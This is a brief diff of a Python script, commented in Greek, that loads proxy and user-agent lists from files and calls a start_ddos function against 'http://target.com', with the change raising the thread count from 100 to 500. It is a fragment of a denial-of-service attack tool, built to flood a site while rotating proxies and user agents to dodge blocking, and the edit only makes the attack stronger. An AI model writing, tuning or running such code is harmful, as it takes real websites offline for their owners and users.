@@ -44,5 +44,5 @@ proxies_list = read_proxies('proxies.txt')  # Ανάγνωση proxies από τ
 user_agents_list = read_user_agents('user_agents.txt')  # Ανάγνωση user agents από το αρχείο
 
 url = 'http://target.com'
-num_threads = 100  
+num_threads = 500
 start_ddos(url, proxies_list, user_agents_list, num_threads)
